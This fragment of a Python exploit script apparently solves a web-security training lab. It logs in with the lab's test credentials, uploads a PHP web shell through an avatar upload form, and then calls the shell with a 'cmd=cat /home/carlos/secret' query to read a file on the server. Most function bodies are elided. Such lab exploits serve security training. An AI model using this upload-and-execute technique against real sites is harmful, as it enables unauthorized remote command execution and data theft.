...
def upload_vuln_file(s, url, path, filename):
    ...
    if f'The file avatars/{filename} has been uploaded.' in r.text and r.status_code == 200:
...
def main():
    ...
    filename = 'RunamiYachiyo.php'
    login_acc(s, url, '/login', 'wiener', 'peter')
    upload_vuln_file(s, url, '/my-account/avatar', filename)
    secret = get_secret(s, url, f'/files/avatars/{filename}?cmd=cat /home/carlos/secret')
